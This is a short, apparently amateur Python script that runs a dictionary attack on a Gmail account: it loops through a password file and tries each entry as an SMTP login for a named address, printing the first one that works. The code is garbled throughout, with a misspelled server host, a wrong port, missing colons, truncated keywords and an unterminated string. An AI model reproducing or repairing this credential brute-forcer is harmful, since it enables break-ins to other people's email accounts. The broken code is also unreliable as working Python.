import smtplib

smtpserver = smtplib.SMTP("smt.gmail.com", 52)
smtpserver.ehlo()
smtpserver.starttls()


usr = "fikrado1.2@gmail.com"

with open("/password.txt") as passwfile
     for password i passwfile
         try
             smtpserver.login(usr, password.strip())
             print(password.strip())
             brea
         excep smtplibSMTPAuthenticationError
             print("doqoon
